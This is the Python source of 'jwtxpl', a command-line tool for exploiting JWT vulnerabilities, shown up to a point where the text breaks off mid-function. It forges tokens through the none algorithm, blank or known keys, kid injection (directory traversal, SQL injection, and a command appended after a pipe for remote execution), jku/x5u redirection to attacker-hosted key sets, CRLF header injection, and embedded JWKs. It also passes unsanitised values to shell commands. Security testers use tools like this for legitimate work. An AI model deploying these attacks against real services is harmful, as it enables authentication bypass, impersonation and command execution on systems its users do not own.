#!/usr/bin/python3

"""
    A tool to test the security of JWTs.
    Copyright (C) 2021  Andea Tedeschi  andreatedeschi95@gmail.com  DontPanicO

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""


__version__ = "0.1"
__author__ = "DontPanicO"

import os
import sys
import subprocess
import hmac
import hashlib
import base64
import json
import re
import binascii
import argparse
import urllib.parse

try:
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding, rsa, ec
    from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
    from cryptography.hazmat.primitives.asymmetric.ec import EllipticCurvePublicNumbers
    from cryptography.hazmat.primitives.serialization import load_pem_public_key, load_pem_private_key
    from cryptography.x509 import load_pem_x509_certificate
    from cryptography.hazmat.backends.openssl import backend
    from cryptography.hazmat.backends.openssl.rsa import _RSAPublicKey, _RSAPrivateKey
    from cryptography.hazmat.backends.openssl.ec import _EllipticCurvePublicKey, _EllipticCurvePrivateKey
    from cryptography.exceptions import InvalidSignature
except ModuleNotFoundError:
    print(f"jwtxpl: err: Missing dependencies\nRun ./install.sh or pip3 install -r requirements.txt")
    sys.exit(11)


CWD = os.path.dirname(__file__) + "/"


class Bcolors:
    """
    A class used to store colors in some constant, to be retrieved later in the script to return a fancy output.

    """
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class Cracker:

    description = "A command line tool for test security of JWTs"

    usage = """
        python3 jwt-crack.py <token> [OPTIONS]; OR
        jwtxpl <token> [OPTIONS]; IF YOU HAVE USED install.sh
    """
    command = ["jwtxpl"] + [sys.argv[i] for i in range(1, len(sys.argv))]

    output = f"""{Bcolors.OKBLUE}A tool to exploit JWT vulnerabilities...{Bcolors.ENDC}
{Bcolors.HEADER}Version:{Bcolors.ENDC} {Bcolors.OKCYAN}{__version__}{Bcolors.ENDC}
{Bcolors.HEADER}Author:{Bcolors.ENDC} {Bcolors.OKCYAN}{__author__}{Bcolors.ENDC}
{Bcolors.HEADER}Command:{Bcolors.ENDC} {Bcolors.OKCYAN}{" ".join(command)}{Bcolors.ENDC}
    """

    def __init__(self, token, alg, path_to_key, user_payload, complex_payload, remove_from, add_into, auto_try, kid, exec_via_kid,
                 specified_key, jku_basic, jku_redirect, jku_header_injection, x5u_basic, x5u_header_injection, verify_token_with,
                 sub_time, add_time, unverified=False, blank=False, decode=False, manual=False, generate_jwk=False):
        """
        :param token: The user input token -> str
        :param alg: The algorithm for the attack. HS256 or None -> str
        :param path_to_key: A file to load the key from -> str
        :param user_payload: What the user want to change in the payload -> list
        :param complex_payload: A string (key:value) containing key separated by , to access subclaims -> str
        :param remove_from: What the user want to delete in the header or in the payload -> list
        :param add_into: What the user want to add in the header (useless in the payload) -> list
        :param auto_try: The domain from which the script try to retrieve a key via openssl -> str
        :param kid: The type of payload to inject in the kid header. DirTrv, SQLi or RCE -> str
        :param exec_via_kid: A command to append in the kid header -> str
        :param specified_key: A string set to be used as key -> str
        :param jku_basic: The main url on which the user want to host the malformed jwks file -> str
        :param jku_redirect: Comma separated server url and the user one -> str
        :param jku_header_injection: The server url vulnerable to HTTP header injection -> str
        :param x5u_basic: The main url on which the user want to host the malformed jwks file -> str
        :param x5u_header_injection: The server url vulnerable to HTTP header injection -> str
        :param verify_token_with: The file of the public key to be used for verification -> str
        :param sub_time: Hours to subtract from time claims if any -> str
        :param add_time: Hours to add to time claims if any -> str
        :param unverified: A flag to set if the script have to act as the host doesn't verify the signature -> Bool
        :param blank: A flag to set if the key has to be an empty string -> Bool
        :param decode: A flag to set if the user need only to decode the token -> Bool
        :param manual: A flag to set if the user need to craft an url manually -> Bool
        :param generate_jwk: A flag, if present a jwk will be generated and inserted in the token header -> Bool

        Initialize the variables that we need to be able to access from all the class; all the params plus
        self.file and self.token. Then it call the validation method to validate some of these variables (see below),
        and lastly create a token dictionary, with dictionarize_token, and get decoded header and payload out of it.

        """
        print(Cracker.output)
        self.token = token
        self.alg = alg
        self.path_to_key = path_to_key
        """self.file and self.key will be overriden later"""
        self.file = None
        self.key = None
        self.user_payload = user_payload
        self.complex_payload = complex_payload
        self.remove_from = remove_from
        self.add_into = add_into
        self.auto_try = auto_try
        self.kid = kid
        self.exec_via_kid = exec_via_kid
        self.specified_key = specified_key
        self.jku_basic = jku_basic
        self.jku_redirect = jku_redirect
        self.jku_header_injection = jku_header_injection
        self.x5u_basic = x5u_basic
        self.x5u_header_injection = x5u_header_injection
        self.verify_token_with = verify_token_with
        self.sub_time = sub_time
        self.add_time = add_time
        self.unverified = unverified
        self.blank = blank
        self.decode = decode
        self.manual = manual
        self.generate_jwk = generate_jwk
        """Groups args based on requirements"""
        self.jwks_args = [self.jku_basic, self.jku_redirect, self.jku_header_injection, self.x5u_basic, self.x5u_header_injection, self.generate_jwk]
        self.cant_asymmetric_args = [self.auto_try, self.kid, self.exec_via_kid, self.specified_key, self.blank]
        self.require_alg_args = [self.path_to_key] + self.cant_asymmetric_args + self.jwks_args
        """Open devnull for stdin, stderr, stdout redirects"""
        self.devnull = open(os.devnull, 'wb')
        """Call the validation"""
        self.validation()
        self.token_dict = Cracker.dictionarize_token(token)
        self.original_token_header, self.original_token_payload = Cracker.decode_encoded_token(self.token_dict)

    def validation(self):
        """
        Does some validation on; self.token, self.alg, and all key related arguments.
        This function is written in a terrible way, but it works. Since it has to handle so many different use cases
        for now it's enough. If you want to make some restyle, without compromising its functionality, you're welcome.

        1)Validate the token: Using check_token, looks if the token is valid. If not quits out.

        2)Validate time values: If a time claim related arg has been passed it checks that has a proper value. If not quits.

        3)Validate alg: If an algorithm has been passed, it checks that's a valid one. If it's None or none, checks that no
        argument contained in self.require_alg_args, has been passed. Then advises the user that some libraries use none, while
        others None. Then if an RSA/ec based alg has been set by the user, it checks that he's running a proper attack. Finally,
        set self.alg as uppercase.

        4)Validate key: This is the most complex validation since the key can be retrieved from different arguments.
        This validation has to solve lot of possible conflicts, at least giving warnings to the user and giving priority
        to the right argument. First, if one of self.decode or self.verify_token_ with is true, all this validation will
        be skipped, since decoding the token does not need any key, and it will quits immediately after the decoded header
        and payload have been printed out.
        Then it checks for conflicts with self.manual. This is not a key related argument, but there was no better ways to
        place it. If self.alg is RS* or PS* it looks for: No argument in self.cant_asymmetric is True; At least one argument
        in self.jwks_args or self.path_to_key is True; No more than one argument in self.jwks_args or self.path_to_key is
        True. Then it checks if the key pair has to be generated or if we have a key file to start from. The completes the key
        generation extracting also the modulus and the exponent to be inserted in the jwks file.
        If self.alg is ES*, validation is identical to RS*/PS*, but with elliptic curve cryptography. So the tool need also to
        determine which curve to use, calling get_ec_curve.
        If self.alg is HS* instead, it looks for: No argument in self.jwks_args is True; At least one argument in
        self.cant_asymmetric or self.path_to_key is True; No more than one argument in self.cant_asymmetric or self.path_to_key
        is True. If self.auto_try is True call get_key_from_ssl_cert and store the path to the key file in self.path_to_key.
        If self.kid is True instead, check that it has a valid value, and set the key-password basing on the payload choice.
        Same for self.exec_via_kid, where the key does not matter since the code will be executed before the token has been
        validated. If a key has been specified in self.specified_key stores it in self.key. Last, if self.path_to_key has a
        value, checks that the path exists and opens the file to read the key from.

        """
        """Validate the token"""
        token_is_valid = Cracker.check_token(self.token)
        if not token_is_valid:
            print(f"{Bcolors.FAIL}jwtxpl: err: Invalid token!{Bcolors.ENDC}")
            sys.exit(3)
        """Validate Time"""
        try:
            if self.add_time:
                self.add_time = int(self.add_time)
                if not 0 < self.add_time < 25:
                    print(f"{Bcolors.FAIL}jwtxpl: err: Accepted time values are from 1 to 24{Bcolors.ENDC}")
                    sys.exit(6)
            if self.sub_time:
                self.sub_time = int(self.sub_time)
                if not 0 < self.sub_time < 25:
                    print(f"{Bcolors.FAIL}jwtxpl: err: Accepted time values are from 1 to 24{Bcolors.ENDC}")
                    sys.exit(6)
        except ValueError:
            print(f"{Bcolors.FAIL}jwtxpl: err: Time values must be numeric{Bcolors.ENDC}")
            sys.exit(6)
        """Validate alg"""
        if not self.decode:
            if not self.alg:
                print(f"{Bcolors.FAIL}jwtxpl: err: Missing --alg. Alg is always required if you are not decoding{Bcolors.ENDC}")
                sys.exit(4)
        if self.alg is not None:
            valid_algs = [
                "none", "None",
                "hs256", "hs384", "hs512",
                "rs256", "rs384", "rs512",
                "ps256", "ps384", "ps512",
                "es256", "es384", "es512",
            ]
            if self.alg.lower() not in valid_algs:
                print(f"{Bcolors.FAIL}jwtxpl: err: Invalid algorithm{Bcolors.ENDC}")
                sys.exit(6)
            if self.alg == "None" or self.alg == "none":
                if any(self.require_alg_args):
                    print(f"{Bcolors.FAIL}jwtxpl: err: You don't need a key with None/none algorithm{Bcolors.ENDC}")
                    sys.exit(2)
                print(f"{Bcolors.OKBLUE}INFO: Some JWT libraries use 'none' instead of 'None', make sure to try both.{Bcolors.ENDC}")
            elif self.alg.lower()[:2] in ["rs", "ps", "ec"]:
                if not any(arg for arg in self.jwks_args + [self.path_to_key, self.verify_token_with, self.unverified]):
                    print(f"{Bcolors.FAIL}jwtxpl: err: RSA/EC is supported only for jwks, verification or simple signing{Bcolors.ENDC}")
                    sys.exit(4)
            self.alg = self.alg.upper()
        """Force self.alg to RS256 for jku attacks if a non RSA/EC alg has been selected"""
        if any(arg for arg in self.jwks_args):
            if self.alg is not None and self.alg[:2] not in ["RS", "PS", "ES"]:
                print(f"{Bcolors.WARNING}jwtxpl: warn: Alg must be RSA or EC with jwks args: it will be forced to RS256{Bcolors.ENDC}")
                self.alg = "RS256"
        """Validate key"""
        if not self.decode and not self.verify_token_with:
            """--manual can be used only with --jku-basic or --x5u-basic"""
            if self.manual:
                if not self.jku_basic and not self.x5u_basic:
                    print(f"{Bcolors.FAIL}jwtxpl: err: You can use --manual only with jku/x5u basic{Bcolors.ENDC}")
                    sys.exit(4)
            if self.alg[:2] == "RS" or self.alg[:2] == "PS":
                """Check for key conflicts"""
                if any(self.cant_asymmetric_args):
                    print(f"{Bcolors.FAIL}jwtxpl: err: You passed some arg not compatible with RS* alg{Bcolors.ENDC}")
                    sys.exit(2)
                elif not any(self.jwks_args + [self.path_to_key, self.unverified]):
                    print(f"{Bcolors.FAIL}jwtxpl: err: Missing an arg for the key{Bcolors.ENDC}")
                    sys.exit(4)
                elif len(list(filter(lambda x: x, self.jwks_args + [self.unverified]))) > 1:
                    print(f"{Bcolors.FAIL}jwtxpl: err: Too many key related arg {Bcolors.ENDC}")
                    sys.exit(2)
                """No argument conflict"""
                key_read_args = [self.path_to_key, self.x5u_basic, self.x5u_header_injection]
                if not any(key_read_args):
                    """No key file to read from"""
                    self.key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
                else:
                    """We have a key file to read from"""
                    if self.path_to_key:
                        if not os.path.exists(self.path_to_key):
                            print(f"{Bcolors.FAIL}jwtxpl: err: No such file {self.path_to_key}{Bcolors.ENDC}")
                            sys.exit(7)
                    if self.x5u_basic or self.x5u_header_injection:
                        """Req a new cert and a new key file"""
                        if not self.path_to_key:
                            x5u_command = 'openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out testing.crt -subj "/CN=testing"'
                            self.path_to_key = "key.pem"
                        else:
                            x5u_command = f'openssl req -key {self.path_to_key} -x509 -days 365 -out testing.crt -subj "/CN=testing"'
                        try:
                            subprocess.run(x5u_command, shell=True, stdin=self.devnull, stderr=self.devnull, stdout=self.devnull, check=True)
                        except subprocess.CalledProcessError:
                            print(f"{Bcolors.FAIL}jwtxpl: err: Error during cert request, please check your connection{Bcolors.FAIL}")
                            sys.exit(7)
                    self.key = Cracker.read_pem_private_key(self.path_to_key)
                    if not isinstance(self.key, _RSAPrivateKey):
                        print(f"{Bcolors.FAIL}jwtxpl: err: Alg/Key mismatch. You should not use EC keys with RS*/PS*{Bcolors.ENDC}")
                        sys.exit(2)
                """Extract public key"""
                self.key.pub = self.key.public_key()
                """Extrac the n and the e"""
                self.key.pub.e = self.key.pub.public_numbers().e
                self.key.pub.n = self.key.pub.public_numbers().n
            elif self.alg[:2] == "ES":
                print(f"{Bcolors.WARNING}jwtxpl: warn: ES* support is under developement. Open issues if you find any{Bcolors.ENDC}")
                """Check for key conflicts"""
                if any(self.cant_asymmetric_args):
                    print(f"{Bcolors.FAIL}jwtxpl: err: You passed some arg not compatible with ES*{Bcolors.ENDC}")
                    sys.exit(2)
                elif not any(self.jwks_args + [self.path_to_key, self.unverified]):
                    print(f"{Bcolors.FAIL}jwtxpl: err: Missing an arg for the key{Bcolors.ENDC}")
                    sys.exit(4)
                elif len(list(filter(lambda x: x, self.jwks_args + [self.unverified]))) > 1:
                    print(f"{Bcolors.FAIL}jwtxpl: err: Too many key related argument{Bcolors.ENDC}")
                    sys.exit(2)
                """No argument conflict"""
                read_key = [self.path_to_key, self.x5u_basic, self.x5u_header_injection]
                if not any(read_key):
                    """We have no key file to read from"""
                    ec_curve = Cracker.get_ec_curve(self.alg)
                    self.key = ec.generate_private_key(ec_curve)
                else:
                    """We have a key file to read from"""
                    if self.path_to_key:
                        if not os.path.exists(self.path_to_key):
                            print(f"{Bcolors.FAIL}jwtxpl: err: No such file {self.path_to_key}{Bcolors.ENDC}")
                            sys.exit(7)
                    if self.x5u_basic or self.x5u_header_injection:
                        if not self.path_to_key:
                            if self.alg[-3:] == "256":
                                curve = "prime256v1"
                            elif self.alg[-3:] == "384":
                                curve = "secp384r1"
                            elif self.alg[-3:] == "512":
                                curve = "secp521r1"
                            x5u_command = f'openssl req -newkey ec -pkeyopt ec_paramgen_curve:{curve} -nodes -keyout key.pem -x509 -days 365 -out testing.crt -subj "/CN=testing"'
                            self.path_to_key = "key.pem"
                        else:
                            x5u_command = f'openssl req -key {self.path_to_key} -x509 -days 365 -out testing.crt -subj "/CN=testing"'
                        try:
                            subprocess.run(x5u_command, shell=True, stdin=self.devnull, stderr=self.devnull, stdout=self.devnull, check=True)
                        except subprocess.CalledProcessError:
                            print(f"{Bcolors.FAIL}jwtxpl: err: Error during cert request, please check your connection{Bcolors.ENDC}")
                            sys.exit(7)
                    self.key = Cracker.read_pem_private_key(self.path_to_key)
                    if not isinstance(self.key, _EllipticCurvePrivateKey):
                        print(f"{Bcolors.FAIL}jwtxpl: err: Alg/Key mismatch. You should not use RSA keys with ES*{Bcolors.FAIL}")
                        sys.exit(2)
                "Extract the public key and public numbers"
                self.key.pub = self.key.public_key()
                self.key.pub.x = self.key.pub.public_numbers().x
                self.key.pub.y = self.key.pub.public_numbers().y
            elif self.alg[:2] == "HS":
                """Check for key conflicts"""
                if any(self.jwks_args):
                    print(f"{Bcolors.FAIL}jwtxpl: err: You passed some arg not compatible with HS*{Bcolors.ENDC}")
                    sys.exit(2)
                elif not any(self.cant_asymmetric_args + [self.path_to_key, self.unverified]):
                    print(f"{Bcolors.FAIL}jwtxpl: err: Missing an arg for the key{Bcolors.ENDC}")
                    sys.exit(4)
                elif len(list(filter(lambda x: x, self.cant_asymmetric_args + [self.path_to_key, self.unverified]))) > 1:
                    print(f"{Bcolors.FAIL}jwtxpl: err: Too many key related args{Bcolors.ENDC}")
                    sys.exit(2)
                """No argument conflict"""
                if self.auto_try is not None:
                    path = Cracker.get_key_from_ssl_cert(self.auto_try)
                    self.path_to_key = path
                elif self.kid is not None:
                    if self.kid.lower() == "dirtrv":
                        self.kid = "DirTrv"
                        self.key = ""
                    elif self.kid.lower() == "sqli":
                        self.kid = "SQLi"
                        self.key = "zzz"
                    elif self.kid.lower() == "rce":
                        self.kid = "RCE"
                        """Command will be executed before verifing the signature"""
                        self.unverified = True
                    else:
                        print(f"{Bcolors.FAIL}jwtxpl: err: Invalid --inject-kid{Bcolors.ENDC}")
                        sys.exit(6)
                elif self.exec_via_kid is not None:
                    self.unverified = True
                elif self.specified_key is not None:
                    self.key = self.specified_key
                elif self.blank:
                    self.key = ""
                if self.path_to_key is not None:
                    if not os.path.exists(self.path_to_key):
                        print(f"{Bcolors.FAIL}jwtxpl: err: No such file {self.path_to_key}{Bcolors.ENDC}")
                        sys.exit(7)
                    self.file = open(self.path_to_key, 'r')
                    self.key = self.file.read()


    def decode_and_quit(self):
        """
        The JWT "decoding" function.

        Since the decoded header and payload have already been stored when the __init__ method ran, it just displays
        them on the screen.
        This function is intended to run if -d (or --decode) is present so it prints outs some warnings if useless
        parameters have been called along with -d itself.

        """
        other_args = [
                      self.alg, self.path_to_key, self.user_payload, self.complex_payload,
                      self.remove_from, self.add_into, self.auto_try, self.kid,
                      self.exec_via_kid, self.specified_key, self.jku_basic,
                      self.jku_redirect, self.jku_header_injection, self.x5u_basic,
                      self.x5u_header_injection, self.verify_token_with,
                      self.sub_time, self.add_time, self.unverified,
                      self.manual, self.generate_jwk
        ]
        if any(arg for arg in other_args):
            print(f"{Bcolors.WARNING}jwtxpl: warn: You have not to specify any other argument if you want to decode the token{Bcolors.ENDC}")
        print(f"{Bcolors.HEADER}Header:{Bcolors.ENDC} {Bcolors.OKCYAN}{self.original_token_header}{Bcolors.ENDC}" +
              "\n" +
              f"{Bcolors.HEADER}Payload:{Bcolors.ENDC} {Bcolors.OKCYAN}{self.original_token_payload}{Bcolors.ENDC}"
              )
        sys.exit(0)

    def verify_and_quit(self):
        """
        Read the the key from the path specified at self.verify_token_with and try to verify the token with it.
        Then prints to stdout the result and quits.
        """
        if not os.path.exists(self.verify_token_with):
            print(f"{Bcolors.FAIL}jwtxpl: err: No such file {self.verify_token_with}{Bcolors.ENDC}")
            sys.exit(7)
        other_args = [
                      self.path_to_key, self.user_payload, self.complex_payload,
                      self.remove_from, self.add_into, self.auto_try, self.kid,
                      self.exec_via_kid, self.specified_key, self.jku_basic,
                      self.jku_redirect, self.jku_header_injection, self.x5u_basic,
                      self.x5u_header_injection, self.sub_time, self.add_time,
                      self.unverified, self.decode, self.manual,
                      self.generate_jwk
        ]
        if any(arg for arg in other_args):
            print(f"{Bcolors.WARNING}jwtxpl: warn: Only the alg is required to verify the signature{Bcolors.ENDC}")
        sign_hash = Cracker.get_sign_hash(self.alg)
        try:
            if self.alg[:2] == "RS":
                key = Cracker.read_pem_public_key(self.verify_token_with)
                if key is None:
                    cert = Cracker.read_pem_certificate(self.verify_token_with)
                    if cert is None:
                        print(f"{Bcolors.FAIL}jwtxpl: err: key/cert file is not PEM format{Bcolors.ENDC}")
                        sys.exit(6)
                    key = cert.public_key()
                verified = Cracker.verify_token_with_rsa_pkcs1(key, self.token, sign_hash)
            elif self.alg[:2] == "PS":
                key = Cracker.read_pem_public_key(self.verify_token_with)
                if key is None:
                    cert = Cracker.read_pem_certificate(self.verify_token_with)
                    if cert is None:
                        print(f"{Bcolors.FAIL}jwtxpl: err: key/cert file is not PEM format{Bcolors.ENDC}")
                        sys.exit(6)
                    key = cert.public_key()
                verified = Cracker.verify_token_with_rsa_pss(key, self.token, sign_hash)
            elif self.alg[:2] == "ES":
                key = Cracker.read_pem_public_key(self.verify_token_with)
                if key is None:
                    cert = Cracker.read_pem_certificate(self.verify_token_with)
                    if cert is None:
                        print(f"{Bcolors.FAIL}jwtxpl: err: key/cert file is not PEM format{Bcolors.ENDC}")
                        sys.exit(6)
                    key = cert.public_key()
                verified = Cracker.verify_token_with_ec(key, self.token, sign_hash)
            elif self.alg[:2] == "HS":
                with open(self.verify_token_with, 'r') as file:
                    key = file.read()
                verified = Cracker.verify_token_with_hmac(key, self.token, sign_hash)
        except (TypeError, AttributeError):
            print(f"{Bcolors.FAIL}jwtxpl: err: Key mismatch. the key you passed is not compatible with {self.alg}{Bcolors.ENDC}")
            sys.exit(2)
        result = f"Verified with {self.verify_token_with}" if verified else f"Unverified with {self.verify_token_with}"
        print(f"{Bcolors.HEADER}Token:{Bcolors.ENDC} {Bcolors.OKCYAN}{result}{Bcolors.ENDC}")
        sys.exit(0)

    def modify_header_and_payload(self):
        """
        Starting from the originals decoded header and payload, modify them according to the user input.

        Using json, the function create two dictionaries of self.original_token_header and self.original_token_payload,
        in order to access and modify them as dict object. If add_into is present, the function validates it and add the
        specified key/s in the specified dictionary. If we have some header injection like kid or jku, the script modifys
        those headers with the related payload.
        It changes the algorithm to the one specified by the user, then look he has also declared any payload change.
        If he has, the function calls the change_payload method, for each change stored in self.user_payload.
        If self.remove_from has been passed, it removes the specified key/s from the corresponding dictionary.

        N.B. self.user_payload is a list and, any time the user call a -p, the value went stored in another list inside
        self.user_payload. So it basically contains as many list as the user calls to --payload. And the value of each
        calls will always be the firs and only element of each list. This is also valid for self.add_into and self.remove_from.

        :return: The modified header and payload strings.
        """
        header_dict = json.loads(self.original_token_header)
        payload_dict = json.loads(self.original_token_payload)
        header_dict['alg'] = self.alg
        commons_jwks_url_ends = ["jwks.json", "jwks", "keys", ".json"]
        if self.add_into:
            for item in self.add_into:
                try:
                    to_dict = item[0].split(":")[0]
                    to_add = item[0].split(":")[1]
                except IndexError:
                    print(f"{Bcolors.FAIL}jwtxpl: err: --add-into must have key:value syntax, where key is header or payload{Bcolors.ENDC}")
                    sys.exit(5)
                if to_dict != "header" and to_dict != "payload":
                    print(f"{Bcolors.FAIL}jwtxpl: err: You can insert keys only into header and payload{Bcolors.ENDC}")
                    sys.exit(6)
                if to_dict == "header":
                    header_dict = Cracker.add_key(header_dict, to_add)
                elif to_dict == "payload":
                    print(f"{Bcolors.WARNING}jwtxpl: warn: Adding key to payload is useless since you can do it directly via --payload{Bcolors.ENDC}")
                    payload_dict = Cracker.add_key(payload_dict, to_add)
        if self.add_time:
            payload_dict = Cracker.modify_time_claims(self.add_time, payload_dict, instruction="add")
        if self.sub_time:
            payload_dict = Cracker.modify_time_claims(self.sub_time, payload_dict, instruction="del")
        if self.kid:
            if "kid" not in header_dict.keys():
                print(f"{Bcolors.FAIL}jwtxpl: err: JWT header has no kid{Bcolors.ENDC}")
                sys.exit(1)
            if self.kid != "DirTrv":
                header_dict['kid'] += Cracker.inject_kid(self.kid)
            elif self.kid == "DirTrv":
                header_dict['kid'] = Cracker.inject_kid(self.kid)
        elif self.exec_via_kid:
            if "kid" not in header_dict.keys():
                print(f"{Bcolors.FAIL}jwtxpl: err: JWT header has no kid{Bcolors.ENDC}")
                sys.exit(1)
            header_dict['kid'] += "|" + self.exec_via_kid
        elif self.jku_basic:
            if "jku" not in header_dict.keys():
                print(f"{Bcolors.FAIL}jwtxpl: err: JWT header has no jku{Bcolors.ENDC}")
                sys.exit(1)
            if self.manual:
                url = self.jku_basic
            else:
                if any(self.jku_basic.endswith(end) for end in commons_jwks_url_ends):
                    print(f"{Bcolors.FAIL}jwtxpl: err: '/.well-known/jwks.json' will automatically be appended to you url. If you need to specify the complete url use --manual{Bcolors.ENDC}")
                    sys.exit(5)
                url = self.jku_basic.rstrip("/") + "/.well-known/jwks.json"
            self.jku_basic_attack(header_dict)
            header_dict['jku'] = url
        elif self.jku_redirect:
            if "jku" not in header_dict.keys():
                print(f"{Bcolors.FAIL}jwtxpl: err: JWT header has no jku{Bcolors.ENDC}")
                sys.exit(1)
            if "HERE" not in self.jku_redirect:
                print(f"{Bcolors.FAIL}jwtxpl: err: You have to specify HERE keyword in the place you want to inject{Bcolors.ENDC}")
                sys.exit(5)
            if "," not in self.jku_redirect:
                print(f"{Bcolors.FAIL}jwtxpl: err: Missing url. Please pass the vulnerable url and your one as comma separated values{Bcolors.ENDC}")
                sys.exit(5)
            if any(self.jku_redirect.endswith(end) for end in commons_jwks_url_ends):
                print(f"{Bcolors.FAIL}jwtxpl: err: '/.well-known/jwks.json' will automatically be appended to your url. To craft an url by yourself, use --jku-basic with the --manual option{Bcolors.ENDC}")
                sys.exit(5)
            main_url = self.jku_redirect.split(",")[0]
            your_url = self.jku_redirect.split(",")[1].rstrip("/") + "/.well-known/jwks.json"
            self.jku_basic_attack(header_dict)
            header_dict['jku'] = main_url.replace("HERE", your_url)
        elif self.jku_header_injection:
            if "jku" not in header_dict.keys():
                print(f"{Bcolors.FAIL}jwtxpl: err: JWT header has no jku{Bcolors.ENDC}")
                sys.exit(1)
            if "HERE" not in self.jku_header_injection:
                print(f"{Bcolors.FAIL}jwtxpl: err: You have to specify HERE keyword in the place you want to inject{Bcolors.ENDC}")
                sys.exit(5)
            body = self.jku_via_header_injection(header_dict)
            content_length = len(body)
            body = Cracker.url_escape(body, "[]{}")
            injection = f"%0d%0aContent-Length:+{content_length}%0d%0a%0d%0a{body}"
            url = self.jku_header_injection.replace("HERE", injection)
            header_dict['jku'] = url
        elif self.x5u_basic:
            if "x5u" not in header_dict.keys():
                print(f"{Bcolors.FAIL}jwtxpl: err: JWT header has no x5u{Bcolors.ENDC}")
                sys.exit(1)
            if self.manual:
                url = self.x5u_basic
            else:
                if any(self.x5u_basic.endswith(end) for end in commons_jwks_url_ends):
                    print(f"{Bcolors.FAIL}jwtxpl: err: '/.well-known/jwks.json' will automatically be appended to your url. If you need to specify the complete url please use --manual{Bcolors.ENDC}")
                    sys.exit(5)
                url = self.x5u_basic.rstrip("/") + "/.well-known/jwks.json"
            self.x5u_basic_attack(header_dict)
            header_dict['x5u'] = url
        elif self.x5u_header_injection:
            if "x5u" not in header_dict.keys():
                print(f"{Bcolors.FAIL}jwtxpl: err: JWT has no x5u header{Bcolors.ENDC}")
                sys.exit(1)
            if "HERE" not in self.x5u_header_injection:
                print(f"{Bcolors.FAIL}jwtxpl: err: You have to specify HERE keyword in the place you want to inject{Bcolors.ENDC}")
                sys.exit(5)
            body = self.x5u_via_header_injection(header_dict)
            content_length = len(body)
            body = Cracker.url_escape(body, "[]{}")
            injection = f"%0d%0aContent-Length:+{content_length}%0d%0a%0d%0a{body}"
            url = self.x5u_header_injection.replace("HERE", injection)
            header_dict['x5u'] = url
        elif self.generate_jwk:
            jwk_id = header_dict['kid'] if 'kid' in header_dict.keys() else "identifier"
            if self.alg[:2] in ["RS", "PS"]:
                numbers = [self.key.pub.n, self.key.pub.e]
            elif self.alg[:2] == "ES":
                numbers = [self.key.pub.x, self.key.pub.y]
            crafted_jwk = Cracker.generate_jwk(jwk_id, numbers, jwa=self.alg)
            header_dict = Cracker.embed_jwk_in_jwt_header(header_dict, crafted_jwk)
        if self.user_payload:
            for item in self.user_payload:
                payload_dict = Cracker.change_payload(item[0], payload_dict)
        if self.complex_payload:
            for item in self.complex_payload:
                payload_dict = Cracker.change_payload_complex(item[0], payload_dict)
        if self.remove_from:
            for item in self.remove_from:
                try:
                    from_dict = item[0].split(":")[0]
                    to_del = item[0].split(":")[1]
                except IndexError:
                    print(f"{Bcolors.FAIL}jwtxpl: err: --remove-from must have key:value syntax, where key is header or payload{Bcolors.ENDC}")
                    sys.exit(5)
                if from_dict != "header" and from_dict != "payload":
                    print(f"{Bcolors.FAIL}jwtxpl: err: You can delete keys only from header or payload{Bcolors.ENDC}")
                    sys.exit(6)
                if from_dict == "header" and to_del == "alg" or from_dict == "header" and to_del == "typ":
                    print(f"{Bcolors.FAIL}jwtxpl: err: Deleting key {to_del} will invalidate the token{Bcolors.ENDC}")
                    sys.exit(1)
                if from_dict == "header":
                    header_dict = Cracker.delete_key(header_dict, to_del)
                elif from_dict == "payload":
                    payload_dict = Cracker.delete_key(payload_dict, to_del)
        new_header = json.dumps(header_dict, separators=(",", ":"))
        new_payload = json.dumps(payload_dict, separators=(",", ":"))
        return new_header, new_payload

    def jku_basic_attack(self, header):
        """
        :param header: The header dictionary -> dict.

        Gets the jwks.json file from the url specified in the jku header. Then loads the file as json in order to
        accesses it to change the modulus and the exponent with the ones of our generated key. Then creates a new
        file named jwks.json in the crafted/ directory and writes the dump of the jwks dict into it.
        """
        filename = "jwtxpl_jwks.json"
        command = f"wget -O {filename} " + header['jku']
        try:
            command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
        except subprocess.CalledProcessError:
            print(f"{Bcolors.FAIL}jwtxpl: err: Can't download jwks file from url specified in jku header{Bcolors.ENDC}")
            sys.exit(1)
        with open(filename) as jwks_orig_file:
            jwks_dict = json.load(jwks_orig_file)
        if len(jwks_dict['keys']) == 1:
            index = 0
        else:
            sign_hash = Cracker.get_sign_hash(self.alg)
            index = Cracker.find_verifier_key_from_jwks(self.token, jwks_dict, sign_hash, jwa=self.alg)
        try:
            if self.alg[:2] in ["RS", "PS"]:
                jwks_dict['keys'][index]['e'] = base64.urlsafe_b64encode(
                    self.key.pub.e.to_bytes(self.key.pub.e.bit_length() // 8 + 1, byteorder='big')
                ).decode('utf-8').rstrip("=")
                jwks_dict['keys'][index]['n'] = base64.urlsafe_b64encode(
                    self.key.pub.n.to_bytes(self.key.pub.n.bit_length() // 8 + 1, byteorder='big')
                ).decode('utf-8').rstrip("=")
            elif self.alg[:2] == "ES":
                jwks_dict['keys'][index]['x'] = base64.urlsafe_b64encode(
                    self.key.pub.x.to_bytes(self.key.pub.x.bit_length() // 8 + 1, byteorder='big')
                ).decode('utf-8').rstrip("=")
                jwks_dict['keys'][index]['y'] = base64.urlsafe_b64encode(
                    self.key.pub.y.to_bytes(self.key.pub.y.bit_length() // 8 + 1, byteorder='big')
                ).decode('utf-8').rstrip("=")
        except (TypeError, IndexError):
            print(f"{Bcolors.FAIL}jwtxpl: err: Non standard JWKS file{Bcolors.ENDC}")
            sys.exit(1)
        with open(f"{CWD}crafted/jwks.json", 'w'):
